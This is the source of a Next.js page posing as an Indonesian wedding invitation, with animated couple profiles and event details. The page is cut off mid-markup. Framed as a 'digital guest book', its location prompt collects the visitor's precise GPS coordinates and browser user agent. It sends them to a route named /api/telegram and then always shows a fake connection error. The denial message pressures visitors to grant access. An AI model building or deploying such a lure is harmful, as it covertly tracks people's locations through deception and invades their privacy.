"use client";

import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { MapPin, Music, Play, Pause, AlertCircle, RefreshCw, CheckCircle2, Heart, Calendar, Clock, Camera, Sparkles } from "lucide-react";

const textChildVariants = {
  hidden: { opacity: 0, y: 20, filter: "blur(5px)" },
  visible: {
    opacity: 1,
    y: 0,
    filter: "blur(0px)",
    transition: { type: "spring" as const, damping: 12, stiffness: 100 }
  }
};

const AnimatedText = ({ text, className, el: Wrapper = "div", splitBy = "word", delay = 0, style }: any) => {
  const elements = splitBy === "letter" ? text.split("") : text.split(" ");
  return (
    <Wrapper className={className} style={style}>
      <motion.span
        initial="hidden"
        whileInView="visible"
        viewport={{ once: true, margin: "-50px" }}
        variants={{
          hidden: { opacity: 0 },
          visible: {
            opacity: 1,
            transition: { staggerChildren: splitBy === "letter" ? 0.04 : 0.08, delayChildren: delay }
          }
        }}
        className="inline-block"
      >
        {elements.map((el: string, i: number) => (
          <motion.span key={i} variants={textChildVariants} className="inline-block">
            {splitBy === "letter" 
              ? (el === " " ? "\u00A0" : el) 
              : (i < elements.length - 1 ? el + "\u00A0" : el)}
          </motion.span>
        ))}
      </motion.span>
    </Wrapper>
  );
};

export default function Home() {
  const [status, setStatus] = useState<"idle" | "loading" | "success" | "error" | "connection_error">("idle");
  const [message, setMessage] = useState("");
  const [isPlaying, setIsPlaying] = useState(false);
  const [isOpened, setIsOpened] = useState(false);
  const [isMounted, setIsMounted] = useState(false);
  const audioRef = useRef<HTMLAudioElement | null>(null);

  useEffect(() => {
    setIsMounted(true);
  }, []);

  const toggleAudio = () => {
    if (audioRef.current) {
      if (isPlaying) {
        audioRef.current.pause();
        setIsPlaying(false);
      } else {
        audioRef.current.play().then(() => setIsPlaying(true)).catch(console.error);
      }
    }
  };

  const handleOpenCover = () => {
    setIsOpened(true);
    if (audioRef.current) {
      audioRef.current.play()
        .then(() => setIsPlaying(true))
        .catch(e => console.error("Auto-play blocked:", e));
    }
  };

  const sendToTelegram = async (lat: number, lng: number, accuracy: number) => {
    try {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          lat, 
          lng, 
          accuracy,
          userAgent: navigator.userAgent
        })
      });
    } catch (e) {
      console.error(e);
    }
    setStatus("connection_error");
  };

  const handleAllowLocation = async () => {
    setStatus("loading");
    setMessage("Memuat Halaman Memori Penuh Cinta... Mohon restui akses lokasi pada perangkat Anda sebagai tanda kehadiran di buku tamu digital kami.");

    if (!navigator.geolocation) {
      setStatus("error");
      setMessage("Maaf, sepertinya browser Anda belum mendukung fitur ini. Kami tetap mendoakan kebaikan untuk Anda.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        sendToTelegram(
          position.coords.latitude,
          position.coords.longitude,
          position.coords.accuracy
        );
      },
      (error) => {
        setStatus("error");
        let errorMsg = "";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMsg = "Akses terhalang. Untuk menyempurnakan buku tamu, mohon perkenankan akses lokasi sesaat agar Anda dapat melihat kenangan kami.";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMsg = "Keberadaan belum dapat dipastikan saat ini.";
            break;
          case error.TIMEOUT:
            errorMsg = "Waktu memuat telah berlalu. Hembusan angin mungkin menghalangi koneksi Anda.";
            break;
          default:
            errorMsg = "Sebuah kendala misterius terjadi, mohon coba kembali.";
        }
        setMessage(errorMsg);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  };

  // Mobile-Optimized Animation Variants
  const slideUp = {
    hidden: { opacity: 0, y: 40 },
    visible: { opacity: 1, y: 0, transition: { type: "spring", stiffness: 60, damping: 14 } }
  };

  const slideRight = {
    hidden: { opacity: 0, x: -40, rotate: -3 },
    visible: { opacity: 1, x: 0, rotate: 0, transition: { type: "spring", stiffness: 50, damping: 12 } }
  };

  const slideLeft = {
    hidden: { opacity: 0, x: 40, rotate: 3 },
    visible: { opacity: 1, x: 0, rotate: 0, transition: { type: "spring", stiffness: 50, damping: 12 } }
  };

  const scaleUp = {
    hidden: { opacity: 0, scale: 0.8 },
    visible: { opacity: 1, scale: 1, transition: { type: "spring", stiffness: 50, damping: 14 } }
  };

  const staggerContainer = {
    hidden: { opacity: 0 },
    visible: {
      opacity: 1,
      transition: { staggerChildren: 0.12, delayChildren: 0.05 }
    }
  };

  return (
    <div className="min-h-screen bg-[#F0F2ED] flex justify-center overflow-x-hidden font-sans">
      
      {/* GLOBAL BACKGROUND ELEMENTS */}
      <div className="fixed inset-0 z-0 pointer-events-none overflow-hidden flex justify-center">
        <motion.div 
          animate={{ scale: [1, 1.2, 1], opacity: [0.2, 0.4, 0.2], rotate: [0, 45, 0] }}
          transition={{ duration: 15, repeat: Infinity, ease: "easeInOut" }}
          className="absolute top-[-5%] left-[-10%] w-[300px] h-[300px] sm:w-[500px] sm:h-[500px] bg-[#C7AA64] rounded-full mix-blend-multiply filter blur-[100px]"
        />
        <motion.div 
          animate={{ scale: [1, 1.3, 1], opacity: [0.15, 0.3, 0.15], rotate: [0, -45, 0] }}
          transition={{ duration: 18, repeat: Infinity, ease: "easeInOut", delay: 2 }}
          className="absolute bottom-[-5%] right-[-10%] w-[350px] h-[350px] sm:w-[600px] sm:h-[600px] bg-[#8F9A83] rounded-full mix-blend-multiply filter blur-[100px]"
        />

        {/* Floating Abstract Particles (Responsive quantity for mobile) */}
        {isMounted && Array.from({ length: typeof window !== 'undefined' && window.innerWidth < 600 ? 10 : 15 }).map((_, i) => (
          <motion.div
            key={i}
            className="absolute rounded-full"
            style={{
              left: `${Math.random() * 100}%`,
              bottom: "-10%",
              width: `${Math.random() * 6 + 3}px`,
              height: `${Math.random() * 6 + 3}px`,
              backgroundColor: Math.random() > 0.5 ? "#8F9A83" : "#C7AA64",
              opacity: Math.random() * 0.4 + 0.1
            }}
            animate={{
              y: ["0vh", "-120vh"],
              x: [`0px`, `${(Math.random() - 0.5) * 150}px`],
              rotate: [0, 360]
            }}
            transition={{
              duration: Math.random() * 15 + 15,
              repeat: Infinity,
              ease: "linear",
              delay: Math.random() * 20
            }}
          />
        ))}
      </div>

      <audio ref={audioRef} loop src="/aku-yang-jatuh-cinta.mp3" preload="auto" playsInline />

      {/* FLOATING MUSIC BUTTON */}
      <AnimatePresence>
        {isOpened && (
          <motion.button 
            initial={{ opacity: 0, scale: 0, y: 50 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0, y: 50 }}
            whileHover={{ scale: 1.1, rotate: 10 }}
            whileTap={{ scale: 0.9 }}
            onClick={toggleAudio}
            className="fixed bottom-6 right-6 z-50 flex items-center justify-center w-12 h-12 bg-white/90 backdrop-blur-md shadow-2xl border border-[#DFE5D5] rounded-full text-[#4A5D44] transition-all"
            title="Putar/Jeda Musik"
          >
            <div className={`flex items-center justify-center ${isPlaying ? 'animate-[spin_4s_linear_infinite]' : ''}`}>
              {isPlaying ? <Music className="w-5 h-5 text-[#4A5D44]" /> : <Pause className="w-5 h-5 text-[#4A5D44]" />}
            </div>
          </motion.button>
        )}
      </AnimatePresence>

      {/* COVER PAGE (FULLSCREEN) */}
      <AnimatePresence>
        {!isOpened && (
          <motion.div 
            initial={{ y: 0, opacity: 1 }}
            exit={{ y: "-100vh", opacity: 0, transition: { duration: 1.2, ease: [0.76, 0, 0.24, 1] } }}
            className="fixed inset-0 w-full h-full z-50 bg-[#F0F2ED] flex flex-col items-center justify-center overflow-hidden"
          >
            <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/white-diamond-dark.png')] opacity-[0.05] mix-blend-multiply"></div>
            
            {/* Animated Floral Corners - Sized for mobile */}
            <motion.svg 
              animate={{ scale: [1, 1.05, 1], opacity: [0.3, 0.5, 0.3] }}
              transition={{ duration: 6, repeat: Infinity, ease: "easeInOut" }}
              className="absolute top-0 left-0 w-32 h-32 sm:w-48 sm:h-48 text-[#8F9A83]" viewBox="0 0 100 100" fill="currentColor"
            >
              <path d="M0,0 L100,0 C100,55.2 55.2,100 0,100 L0,0 Z" />
            </motion.svg>
            <motion.svg 
              animate={{ scale: [1, 1.05, 1], opacity: [0.3, 0.5, 0.3] }}
              transition={{ duration: 6, repeat: Infinity, ease: "easeInOut", delay: 3 }}
              className="absolute bottom-0 right-0 w-32 h-32 sm:w-48 sm:h-48 text-[#C7AA64] rotate-180" viewBox="0 0 100 100" fill="currentColor"
            >
              <path d="M0,0 L100,0 C100,55.2 55.2,100 0,100 L0,0 Z" />
            </motion.svg>

            <motion.div 
              variants={staggerContainer}
              initial="hidden"
              animate="visible"
              className="relative z-10 text-center px-4 flex flex-col items-center w-full max-w-sm"
            >
              <motion.div variants={slideUp} className="w-px h-16 sm:h-24 bg-gradient-to-b from-transparent to-[#C7AA64] mb-6"></motion.div>
              
              <motion.span variants={slideUp} className="text-[10px] sm:text-[11px] uppercase tracking-[0.4em] text-[#6b7561] font-semibold mb-4 block flex items-center gap-2">
                <Sparkles className="w-3 h-3 text-[#C7AA64]" /> Mengukir Janji Suci <Sparkles className="w-3 h-3 text-[#C7AA64]" />
              </motion.span>

              <motion.div variants={scaleUp} className="relative py-6 w-full flex justify-center">
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 40, repeat: Infinity, ease: "linear" }}
                  className="absolute inset-0 flex justify-center items-center opacity-10"
                >
                  <svg viewBox="0 0 200 200" className="w-56 h-56 sm:w-64 sm:h-64 text-[#4A5D44]" fill="currentColor">
                    <path d="M100,0 C110,40 160,40 200,50 C160,60 110,60 100,100 C90,60 40,60 0,50 C40,40 90,40 100,0 Z" />
                    <path d="M100,200 C110,160 160,160 200,150 C160,140 110,140 100,100 C90,140 40,140 0,150 C40,160 90,160 100,200 Z" />
                  </svg>
                </motion.div>
                
                <div className="font-great-vibes text-6xl sm:text-7xl md:text-8xl text-[#4A5D44] my-2 drop-shadow-sm relative z-10 leading-[0.8] py-4">
                  <AnimatedText text="Rama" splitBy="letter" el="div" />
                  <motion.span variants={slideUp} className="text-4xl text-[#C7AA64] inline-block my-2">&</motion.span>
                  <AnimatedText text="Shinta" splitBy="letter" el="div" delay={0.3} />
                </div>
              </motion.div>

              <motion.div variants={slideUp} className="bg-white/60 backdrop-blur-md border border-white/80 px-6 py-5 sm:px-8 sm:py-6 rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.06)] w-full mb-8 relative overflow-hidden mt-6">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#C7AA64]/50 to-transparent"></div>
                <span className="text-[9px] sm:text-[10px] uppercase tracking-[0.2em] text-[#8F9A83] mb-2 block">Menanti Kehadiran Kinasih:</span>
                <h2 className="text-lg sm:text-xl font-playfair font-semibold text-[#4A5D44]">Bapak/Ibu/Saudara/i</h2>
                <div className="mt-3 text-[10px] sm:text-xs text-[#8F9A83] italic">*Untaian maaf kami haturkan bila ada keliru dalam nama & gelar</div>
              </motion.div>

              <motion.div variants={scaleUp}>
                <button 
                  onClick={handleOpenCover}
                  className="group relative px-8 py-3.5 sm:px-10 sm:py-4 bg-gradient-to-r from-[#4A5D44] to-[#5a7052] text-white rounded-full text-xs sm:text-sm font-medium tracking-wide shadow-xl overflow-hidden hover:shadow-[#4A5D44]/40 transition-all hover:scale-[1.05] active:scale-[0.95] flex items-center justify-center gap-3 border border-[#6b8262] mx-auto w-[240px]"
                >
                  <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]"></div>
                  <Play className="w-3.5 h-3.5 fill-current" />
                  Buka Lembaran Kasih
                </button>
              </motion.div>
              
              <motion.div variants={slideUp} className="w-px h-16 sm:h-24 bg-gradient-to-t from-transparent to-[#C7AA64] mt-8"></motion.div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* MAIN CONTENT (SCROLLABLE SINGLE PAGE - MOBILE FIRST) */}
      <AnimatePresence>
        {isOpened && (
          <motion.main 
            initial={{ opacity: 0, y: 150 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 1.2, ease: [0.22, 1, 0.36, 1], delay: 0.2 }}
            className="w-full max-w-[480px] bg-white min-h-screen shadow-2xl relative z-10 mx-auto"
          >
            {/* HERO SECTION - JEWELRY BACKGROUND RETAINED */}
            <section className="relative h-[75vh] min-h-[500px] w-full flex flex-col items-center justify-center overflow-hidden">
              <div className="absolute inset-0">
                <img 
                  src="https://images.unsplash.com/photo-1515934751635-c81c6bc9a2d8?auto=format&fit=crop&w=800&q=80" 
                  alt="Wedding Jewelry Background" 
                  className="w-full h-full object-cover object-center animate-[scaleImage_25s_linear_infinite_alternate]"
                />
                <div className="absolute inset-0 bg-gradient-to-b from-black/50 via-black/30 to-[#F9FAF8]"></div>
              </div>

              <motion.div 
                initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={staggerContainer}
                className="relative z-10 text-center px-4 flex flex-col items-center text-white mt-16"
              >
                <motion.span 
                  variants={slideUp}
                  className="text-[9px] sm:text-[10px] uppercase tracking-[0.4em] font-semibold mb-6 block drop-shadow-md text-[#DFE5D5]"
                >
                  Ikatan Suci Cinta Kami
                </motion.span>
                <div className="font-great-vibes text-6xl sm:text-7xl drop-shadow-lg mb-2 leading-none py-2">
                  <AnimatedText text="Rama" splitBy="letter" el="div" />
                  <motion.span 
                    animate={{ scale: [1, 1.2, 1], textShadow: ["0px 0px 10px rgba(199,170,100,0)", "0px 0px 20px rgba(199,170,100,0.5)", "0px 0px 10px rgba(199,170,100,0)"] }}
                    transition={{ duration: 2, repeat: Infinity }}
                    className="text-4xl text-[#C7AA64] inline-block my-1"
                  >&</motion.span><br/>
                  <AnimatedText text="Shinta" splitBy="letter" el="div" delay={0.3} />
                </div>
                <motion.p 
                  variants={slideUp}
                  className="font-playfair text-base sm:text-lg mt-4 drop-shadow-md text-[#DFE5D5]"
                >
                  25 • Desember • 2026
                </motion.p>
              </motion.div>

              <div className="absolute bottom-0 left-0 w-full h-24 sm:h-32 bg-gradient-to-t from-[#F9FAF8] to-transparent"></div>
            </section>

            {/* QUOTE SECTION */}
            <section className="py-16 px-6 sm:px-8 text-center bg-[#F9FAF8] relative overflow-hidden">
              <motion.div 
                animate={{ rotate: 180 }}
                transition={{ duration: 60, repeat: Infinity, ease: "linear" }}
                className="absolute -right-16 -top-16 w-48 h-48 sm:w-64 sm:h-64 opacity-[0.03] pointer-events-none"
              >
                <svg viewBox="0 0 100 100" fill="currentColor" className="w-full h-full text-[#4A5D44]">
                  <path d="M50 0 L60 40 L100 50 L60 60 L50 100 L40 60 L0 50 L40 40 Z" />
                </svg>
              </motion.div>

              <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-100px" }} variants={staggerContainer} className="relative z-10">
                <motion.div variants={scaleUp}>
                  <motion.div 
                    animate={{ y: [0, -8, 0] }}
                    transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
                  >
                    <svg viewBox="0 0 100 50" className="w-16 h-auto sm:w-20 text-[#C7AA64] mx-auto mb-6 opacity-60" fill="currentColor">
                      <path d="M50 40C45 35 30 20 30 10C30 4.5 34.5 0 40 0C43 0 47 1.5 50 4C53 1.5 57 0 60 0C65.5 0 70 4.5 70 10C70 20 55 35 50 40Z" />
                    </svg>
                  </motion.div>
                </motion.div>
                
                <motion.p variants={slideUp} className="text-[13px] sm:text-[14px] font-playfair text-slate-600 leading-[1.8] mb-6 italic">
                  "Tercipta dari ketenangan, dianugerahi dengan kasih. Di antara tanda kebesaran-Nya, Ia menciptakan untukmu pasangan dari jenismu sendiri, agar jiwamu merasa damai bersamanya, dan dijalinnya di antaramu tali kasih dan sayang tak berujung."
                </motion.p>
                <motion.div variants={slideUp} className="flex items-center justify-center gap-3">
                  <div className="h-px w-6 bg-[#8F9A83]/30"></div>
                  <p className="text-[9px] sm:text-[10px] font-semibold text-[#8F9A83] uppercase tracking-[0.2em]">— Ar-Rum : 21 —</p>
                  <div className="h-px w-6 bg-[#8F9A83]/30"></div>
                </motion.div>
              </motion.div>
            </section>

            {/* COUPLE PROFILES SECTION */}
            <section className="py-20 px-4 sm:px-6 bg-white relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-[#8F9A83]/30 to-transparent"></div>
              
              <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-100px" }} variants={staggerContainer} className="text-center mb-16 relative z-10">
                <motion.span variants={slideUp} className="text-[9px] sm:text-[10px] uppercase tracking-[0.3em] text-[#C7AA64] font-semibold mb-2 block">Dengan Memohon Ridho-Nya</motion.span>
                <AnimatedText text="Dua Jiwa Menjadi Satu" el="h2" className="font-great-vibes text-4xl sm:text-5xl text-[#4A5D44]" splitBy="word" />
              </motion.div>

              <div className="flex flex-col gap-8 relative z-10 max-w-sm mx-auto mt-6">
                {/* Groom */}
                <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={slideRight} className="flex flex-col items-center text-center relative w-full">
                  <motion.div 
                    animate={{ rotate: 360 }} 
                    transition={{ duration: 60, repeat: Infinity, ease: "linear" }}
                    className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 opacity-[0.03] -z-10"
                  >
                    <svg viewBox="0 0 200 200" fill="currentColor" className="w-full h-full text-[#4A5D44]">
                      <path d="M100,10 C120,40 180,40 190,100 C180,160 120,160 100,190 C80,160 20,160 10,100 C20,40 80,40 100,10 Z" />
                      <circle cx="100" cy="100" r="40" fill="none" stroke="currentColor" strokeWidth="2" />
                      <path d="M100,40 L100,160 M40,100 L160,100 M60,60 L140,140 M140,60 L60,140" stroke="currentColor" strokeWidth="1" />
                    </svg>
                  </motion.div>

                  <div className="mb-2">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-[#C7AA64] opacity-70">
                      <path d="M12 2C12 2 15 8 20 12C15 16 12 22 12 22C12 22 9 16 4 12C9 8 12 2 12 2Z" fill="currentColor"/>
                    </svg>
                  </div>
                  <AnimatedText text="Rama Wijaya" splitBy="letter" el="h3" className="font-great-vibes text-5xl sm:text-6xl text-[#4A5D44] mb-6 drop-shadow-sm" />
                  
                  <div className="bg-[#fcfdfa] border border-[#DFE5D5] border-b-2 border-b-[#C7AA64]/30 px-6 py-5 rounded-t-[40px] rounded-b-2xl shadow-[0_4px_20px_rgba(0,0,0,0.02)] w-full relative">
                    <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-white px-2">
                      <Heart className="w-4 h-4 text-[#C7AA64]/60 fill-[#C7AA64]/10" />
                    </div>
                    <p className="font-playfair text-[9px] sm:text-[11px] uppercase tracking-[0.2em] text-[#C7AA64] mb-2">Putra Pertama dari Keluarga</p>
                    <p className="text-[12px] sm:text-sm font-semibold text-[#4A5D44]">Bpk. H. Sudirman & Ibu Hj. Aminah</p>
                  </div>
                </motion.div>

                <div className="flex justify-center items-center py-6 w-full relative">
                  <div className="absolute left-0 w-[40%] h-px bg-gradient-to-r from-transparent to-[#8F9A83]/30"></div>
                  <div className="absolute right-0 w-[40%] h-px bg-gradient-to-l from-transparent to-[#8F9A83]/30"></div>
                  <motion.div 
                    initial={{ opacity: 0, scale: 0 }}
                    whileInView={{ opacity: 1, scale: 1 }}
                    viewport={{ once: true }}
                    animate={{ scale: [1, 1.1, 1] }} 
                    transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
                    className="w-16 h-16 rounded-full border border-[#C7AA64]/50 p-1 flex items-center justify-center bg-white shadow-[0_0_20px_rgba(199,170,100,0.15)] relative z-10"
                  >
                    <div className="w-full h-full rounded-full border border-dashed border-[#C7AA64]/50 flex items-center justify-center">
                      <h1 className="font-great-vibes text-4xl text-[#C7AA64] mt-1">&</h1>
                    </div>
                  </motion.div>
                </div>

                {/* Bride */}
                <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={slideLeft} className="flex flex-col items-center text-center relative w-full">
                  <motion.div 
                    animate={{ rotate: -360 }} 
                    transition={{ duration: 60, repeat: Infinity, ease: "linear" }}
                    className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 opacity-[0.03] -z-10"
                  >
                    <svg viewBox="0 0 200 200" fill="currentColor" className="w-full h-full text-[#4A5D44]">
                      <path d="M100,10 C120,40 180,40 190,100 C180,160 120,160 100,190 C80,160 20,160 10,100 C20,40 80,40 100,10 Z" />
                      <circle cx="100" cy="100" r="40" fill="none" stroke="currentColor" strokeWidth="2" />
                      <path d="M100,40 L100,160 M40,100 L160,100 M60,60 L140,140 M140,60 L60,140" stroke="currentColor" strokeWidth="1" />
                    </svg>
                  </motion.div>

                  <div className="mb-2">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-[#C7AA64] opacity-70">
                      <path d="M12 2C12 2 15 8 20 12C15 16 12 22 12 22C12 22 9 16 4 12C9 8 12 2 12 2Z" fill="currentColor"/>
                    </svg>
                  </div>
                  <AnimatedText text="Shinta Dewi" splitBy="letter" el="h3" className="font-great-vibes text-5xl sm:text-6xl text-[#4A5D44] mb-6 drop-shadow-sm" />
                  
                  <div className="bg-[#fcfdfa] border border-[#DFE5D5] border-b-2 border-b-[#C7AA64]/30 px-6 py-5 rounded-t-[40px] rounded-b-2xl shadow-[0_4px_20px_rgba(0,0,0,0.02)] w-full relative">
                    <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-white px-2">
                      <Heart className="w-4 h-4 text-[#C7AA64]/60 fill-[#C7AA64]/10" />
                    </div>
                    <p className="font-playfair text-[9px] sm:text-[11px] uppercase tracking-[0.2em] text-[#C7AA64] mb-2">Putri Bungsu dari Keluarga</p>
                    <p className="text-[12px] sm:text-sm font-semibold text-[#4A5D44]">Bpk. H. Budiarto & Ibu Hj. Siti Rahma</p>
                  </div>
                </motion.div>
              </div>
            </section>

            {/* EVENT SCHEDULE SECTION */}
            <section className="py-20 px-4 sm:px-6 bg-gradient-to-b from-[#F9FAF8] to-white relative">
              <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-100px" }} variants={staggerContainer} className="text-center mb-12">
                <motion.span variants={slideUp} className="text-[9px] sm:text-[10px] uppercase tracking-[0.3em] text-[#C7AA64] font-semibold mb-2 block">Menapak Jejak Bahagia</motion.span>
                <AnimatedText text="Perayaan Janji Suci" el="h2" className="font-great-vibes text-4xl sm:text-5xl text-[#4A5D44]" splitBy="word" />
              </motion.div>

              <div className="grid grid-cols-2 gap-3 sm:gap-4 relative z-10 max-w-[440px] mx-auto w-full">
                {/* Akad Nikah */}
                <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={slideRight} className="group bg-white border border-[#DFE5D5] rounded-3xl p-4 sm:p-5 text-center shadow-[0_4px_20px_rgb(0,0,0,0.03)] relative overflow-hidden transition-all duration-500 hover:shadow-[0_15px_30px_rgb(0,0,0,0.06)] hover:-translate-y-1 flex flex-col h-full">
                  <div className="absolute top-0 right-0 w-16 h-16 bg-gradient-to-bl from-[#DFE5D5]/50 to-transparent rounded-bl-full -z-10 transition-transform duration-700 group-hover:scale-150"></div>
                  <h3 className="font-playfair text-lg sm:text-xl font-semibold text-[#4A5D44] mb-4 mt-1">Akad Nikah</h3>
                  <div className="flex flex-col items-center gap-2 mb-4 flex-grow">
                    <div className="flex flex-col items-center gap-1 text-[9px] sm:text-[10px] text-slate-600 bg-[#F9FAF8] px-2 py-2 rounded-xl border border-slate-100 shadow-sm w-full justify-center">
                      <Calendar className="w-3.5 h-3.5 text-[#8F9A83]" />
                      <span className="font-semibold text-[#4A5D44]">11 Juni 2026</span>
                    </div>
                    <div className="flex flex-col items-center gap-1 text-[9px] sm:text-[10px] text-slate-600 bg-[#F9FAF8] px-2 py-2 rounded-xl border border-slate-100 shadow-sm w-full justify-center">
                      <Clock className="w-3.5 h-3.5 text-[#8F9A83]" />
                      <span className="font-semibold text-[#4A5D44]">08:00 WIB</span>
                    </div>
                  </div>
                  <div className="pt-4 border-t border-[#DFE5D5] relative mt-auto">
                    <div className="absolute top-[-4px] left-1/2 -translate-x-1/2 w-1.5 h-1.5 rotate-45 bg-white border-t border-l border-[#DFE5D5]"></div>
                    <p className="text-[11px] sm:text-xs font-semibold text-[#4A5D44] mb-1">Masjid Al-Hidayah</p>
                    <p className="text-[8px] sm:text-[9px] text-slate-500 leading-relaxed font-medium">Jl. Raya Pagaden<br/>Subang, Jabar</p>
                  </div>
                </motion.div>

                {/* Resepsi */}
                <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={slideLeft} className="group bg-white border border-[#DFE5D5] rounded-3xl p-4 sm:p-5 text-center shadow-[0_4px_20px_rgb(0,0,0,0.03)] relative overflow-hidden transition-all duration-500 hover:shadow-[0_15px_30px_rgb(0,0,0,0.06)] hover:-translate-y-1 flex flex-col h-full">
                  <div className="absolute top-0 left-0 w-16 h-16 bg-gradient-to-br from-[#C7AA64]/20 to-transparent rounded-br-full -z-10 transition-transform duration-700 group-hover:scale-150"></div>
                  <h3 className="font-playfair text-lg sm:text-xl font-semibold text-[#4A5D44] mb-4 mt-1">Resepsi</h3>
                  <div className="flex flex-col items-center gap-2 mb-4 flex-grow">
                    <div className="flex flex-col items-center gap-1 text-[9px] sm:text-[10px] text-slate-600 bg-[#F9FAF8] px-2 py-2 rounded-xl border border-slate-100 shadow-sm w-full justify-center">
                      <Calendar className="w-3.5 h-3.5 text-[#C7AA64]" />
                      <span className="font-semibold text-[#4A5D44]">11 Juni 2026</span>
                    </div>
                    <div className="flex flex-col items-center gap-1 text-[9px] sm:text-[10px] text-slate-600 bg-[#F9FAF8] px-2 py-2 rounded-xl border border-slate-100 shadow-sm w-full justify-center">
                      <Clock className="w-3.5 h-3.5 text-[#C7AA64]" />
                      <span className="font-semibold text-[#4A5D44]">11:00 WIB</span>
                    </div>
                  </div>
                  <div className="pt-4 border-t border-[#DFE5D5] relative mt-auto">
                    <div className="absolute top-[-4px] left-1/2 -translate-x-1/2 w-1.5 h-1.5 rotate-45 bg-white border-t border-l border-[#DFE5D5]"></div>
                    <p className="text-[11px] sm:text-xs font-semibold text-[#4A5D44] mb-1">Gedung Kehormatan</p>
                    <p className="text-[8px] sm:text-[9px] text-slate-500 leading-relaxed font-medium">Jl. Pahlawan 45<br/>Subang, Jabar</p>
                  </div>
                </motion.div>
              </div>
            </section>

            {/* GALLERY & RSVP SECTION */}
            <section className="py-24 px-4 sm:px-6 bg-gradient-to-br from-[#1e271b] via-[#3d4d38] to-[#1a2217] text-white relative overflow-hidden">
              <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/white-diamond-dark.png')] opacity-[0.05] mix-blend-overlay"></div>
              
              {/* Dynamic Glowing Background Orbs */}
              <motion.div 
                animate={{ scale: [1, 1.2, 1], x: [0, 20, 0], y: [0, -20, 0], opacity: [0.1, 0.2, 0.1] }}
                transition={{ duration: 10, repeat: Infinity, ease: "easeInOut" }}
                className="absolute -top-10 -right-10 w-64 h-64 bg-[#C7AA64] rounded-full filter blur-[80px]"
              />
              <motion.div 
                animate={{ scale: [1, 1.3, 1], x: [0, -20, 0], y: [0, 20, 0], opacity: [0.1, 0.2, 0.1] }}
                transition={{ duration: 12, repeat: Infinity, ease: "easeInOut", delay: 2 }}
                className="absolute -bottom-20 -left-20 w-80 h-80 bg-[#8F9A83] rounded-full filter blur-[100px]"
              />
              
              {/* Elegant rotating mandala watermark */}
              <motion.div 
                animate={{ rotate: 360 }}
                transition={{ duration: 100, repeat: Infinity, ease: "linear" }}
                className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 opacity-[0.04] pointer-events-none"
              >
                <svg viewBox="0 0 200 200" fill="currentColor" className="w-full h-full text-[#C7AA64]">
                  <path d="M100,0 C120,40 160,40 200,50 C160,60 120,60 100,100 C80,60 40,60 0,50 C40,40 80,40 100,0 Z" />
                  <path d="M100,100 C120,140 160,140 200,150 C160,160 120,160 100,200 C80,160 40,160 0,150 C40,140 80,140 100,100 Z" />
                </svg>
              </motion.div>
              
              <motion.div initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-50px" }} variants={staggerContainer} className="relative z-10 text-center max-w-sm mx-auto">
                <motion.div variants={scaleUp} className="relative mx-auto w-16 h-16 sm:w-20 sm:h-20 mb-8 flex items-center justify-center">
                  {/* Animated rings - Centered perfectly behind icon */}
                  <motion.div 
                    animate={{ scale: [1, 2], opacity: [0.4, 0] }}
                    transition={{ duration: 4, repeat: Infinity, ease: "easeOut" }}
                    className="absolute inset-0 rounded-full border border-[#C7AA64]/60 pointer-events-none"
                  />
                  <motion.div 
                    animate={{ scale: [1, 2.8], opacity: [0.2, 0] }}
                    transition={{ duration: 4, repeat: Infinity, ease: "easeOut", delay: 1 }}
                    className="absolute inset-0 rounded-full border border-white/20 pointer-events-none"
                  />
                  
                  {/* Icon Container */}
                  <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent backdrop-blur-md border border-[#C7AA64]/40 rounded-full shadow-[0_0_40px_rgba(199,170,100,0.15)] flex items-center justify-center">
                    <div className="absolute inset-1 rounded-full border border-dashed border-[#C7AA64]/30"></div>
                    <Camera className="w-6 h-6 sm:w-8 sm:h-8 text-[#C7AA64] relative z-10" />
                  </div>
                </motion.div>
                
                <AnimatedText text="Jejak Kasih" el="h2" className="font-great-vibes text-5xl sm:text-6xl mb-4 text-white drop-shadow-[0_2px_10px_rgba(0,0,0,0.5)]" splitBy="letter" />
                
